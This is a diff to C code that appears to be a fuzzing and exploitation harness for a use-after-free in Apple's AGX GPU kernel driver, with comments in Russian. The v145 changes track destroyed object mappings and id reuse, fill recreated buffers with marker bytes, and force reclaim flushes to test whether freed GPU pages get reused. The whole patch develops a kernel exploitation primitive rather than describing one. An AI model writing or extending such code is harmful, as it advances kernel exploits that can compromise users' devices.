@@ -18951,6 +18951,7 @@ typedef struct {
     uint32_t shM, shW;
     uint8_t *vaM, *vaW;
     uint64_t nqM, nqW;
+    int rMd, rWd, sMd, sWd;   // v145: mapping считается мёртвым после kr0-destroy
 } dufx;
 typedef struct {
     uint32_t dsel;
@@ -18972,6 +18973,15 @@ static kern_return_t duf_kill1(dufx *x, uint32_t sel, uint64_t id, const char *t
     uint64_t a[1] = { id };
     kern_return_t kr = IOConnectCallScalarMethod(x->c, sel, a, 1, NULL, NULL);
     LOG("[duf]   -> kr 0x%08x (we survived)", (unsigned)kr);
+    if (kr == 0) {   // v145: успешный destroy убивает CPU-mapping объекта —
+        if (sel == 9) {           // читать его в checkall = self-SIGSEGV
+            if (id == x->ridM) x->rMd = 1;
+            if (id == x->ridW) x->rWd = 1;
+        } else if (sel == 13) {
+            if (id == x->shM) x->sMd = 1;
+            if (id == x->shW) x->sWd = 1;
+        }
+    }
     return kr;
 }
 // liveness probes (kernel touches the object; kr 0 ~ alive)
@@ -18979,7 +18989,7 @@ static int duf_res_alive(dufx *x, uint32_t rid) {
     if (!rid) return 0;
     uint64_t a[2] = { rid, 0 };
     uint64_t os = 0;   // sel11 s_set_resource_purgeable: sin 2, sout 1 —
-    uint32_t oc = 1;   // без out-буфера ядро отвечает BadArgument (v140 fix)
+    uint32_t oc = 1;   // без out-буфера ядро отвечает BadArgument (v145 fix)
     kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, &os, &oc);
     LOG("[duf]   probe rid %u (sel11): kr 0x%08x out 0x%llx %s", rid, (unsigned)kr,
         (unsigned long long)os, kr ? "DEAD?" : "alive");
@@ -18991,7 +19001,7 @@ static int duf_queue_alive(dufx *x, uint64_t qid) {
     memset(z, 0, sizeof z);
     uint64_t a[1] = { qid };
     uint64_t os = 0;   // sel26 s_set_priority_and_background: sin 1, strIn 12,
-    uint32_t oc = 1;   // sout 1 — out обязателен (v140 fix)
+    uint32_t oc = 1;   // sout 1 — out обязателен (v145 fix)
     kern_return_t kr = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, &os, &oc, NULL, NULL);
     LOG("[duf]   probe qid %llu (sel26): kr 0x%08x out 0x%llx %s", qid, (unsigned)kr,
         (unsigned long long)os, kr ? "DEAD?" : "alive");
@@ -19007,10 +19017,10 @@ static int duf_nq_alive(dufx *x, uint64_t nqid) {
 }
 static void duf_checkall(dufx *x, const char *tag) {
     long bm = -1, bw = -1, sm = -1, sw = -1, i;
-    if (x->cpuM) { bm = 0; for (i = 0; i < 0x10000; i += 0x40) if (x->cpuM[i] != 0x41) bm++; }
-    if (x->cpuW) { bw = 0; for (i = 0; i < 0x10000; i += 0x40) if (x->cpuW[i] != 0x41) bw++; }
-    if (x->vaM)  { sm = 0; for (i = 0; i < 0x4000; i += 0x40) if (x->vaM[i] != 0x42) sm++; }
-    if (x->vaW)  { sw = 0; for (i = 0; i < 0x4000; i += 0x40) if (x->vaW[i] != 0x42) sw++; }
+    if (x->cpuM && !x->rMd) { bm = 0; for (i = 0; i < 0x10000; i += 0x40) if (x->cpuM[i] != 0x41) bm++; }
+    if (x->cpuW && !x->rWd) { bw = 0; for (i = 0; i < 0x10000; i += 0x40) if (x->cpuW[i] != 0x41) bw++; }
+    if (x->vaM && !x->sMd)  { sm = 0; for (i = 0; i < 0x4000; i += 0x40) if (x->vaM[i] != 0x42) sm++; }
+    if (x->vaW && !x->sWd)  { sw = 0; for (i = 0; i < 0x4000; i += 0x40) if (x->vaW[i] != 0x42) sw++; }
     LOG("[duf] %s: markers bad resM %ld/1024 resW %ld/1024 shM %ld/256 shW %ld/256%s",
         tag, bm, bw, sm, sw,
         ((bm > 0) || (bw > 0) || (sm > 0) || (sw > 0)) ? " [HIT CONTENT CORRUPTION]" : "");
@@ -19108,7 +19118,9 @@ static uint64_t duf_recreate(dufx *x, const dufcls *k) {   // (e)
         uint8_t *cp = NULL;
         uint32_t r = gpu_resource2(x->c, 0x10000, &g, &cp);
         if (cp) memset(cp, 0x41, 0x10000);
-        // v140: GPUVA-reuse — дешёвый однозначный тест page reuse из
+        if (r == x->ridM) { x->cpuM = cp; x->gvaM = g; x->rMd = 0; }   // v145: id reuse
+        if (r == x->ridW) { x->cpuW = cp; x->gvaW = g; x->rWd = 0; }
+        // v145: GPUVA-reuse — дешёвый однозначный тест page reuse из
         // AGXUAT-арены, не зависящий от bzero-on-free (см. retirement-разбор)
         LOG("[duf]   recreated rid %u GPUVA 0x%llx (cpu %p) — victim GPUVA 0x%llx: %s",
             r, (unsigned long long)g, cp, (unsigned long long)x->gvaM,
@@ -19125,6 +19137,8 @@ static uint64_t duf_recreate(dufx *x, const dufcls *k) {   // (e)
         uint8_t *v = NULL;
         uint32_t s = gpu_shmem_t(x->c, 0x4000, 1, &v);
         if (v) memset(v, 0x42, 0x4000);
+        if (s == x->shM) { x->vaM = v; x->sMd = 0; }   // v145
+        if (s == x->shW) { x->vaW = v; x->sWd = 0; }
         LOG("[duf]   recreated shmem %u", s);
         return s;
     }
@@ -19170,7 +19184,7 @@ static void duf_run_class(dufx *x, const dufcls *k) {
     if (k->dsel == 9) duf_reclaim_flush(x);
 }
 
-// V140: (f) AGXUAT reclaim flush. Статика (AGXUAT::queueUnmap/process):
+// V145: (f) AGXUAT reclaim flush. Статика (AGXUAT::queueUnmap/process):
 // unmap'ы копятся до 32 и только потом PTE clear + возврат страниц в
 // inline GPU-арену. Одиночный destroy страницы не возвращает — значит
 // reuse-тест имеет смысл только после форс-флаша (33+ unmap). Сценарий:
@@ -19225,7 +19239,7 @@ static void duf_reclaim_flush(dufx *x) {
 static void p_destroyuaf(void) {
     duf_skip = atol(getenv("FUZZ_DESTROYUAF_SKIP") ?: "0");
     duf_cn = 0;
-    LOG("[duf] v140 destroy-UAF exploitation check (probes fixed: sel11/sel26 sout): skip %ld", duf_skip);
+    LOG("[duf] v145 destroy-UAF exploitation check (probes fixed: sel11/sel26 sout): skip %ld", duf_skip);
     static const struct { uint32_t dsel; const char *nm; } cl[4] = {
         { 9,  "resource" },
         { 7,  "command_queue" },
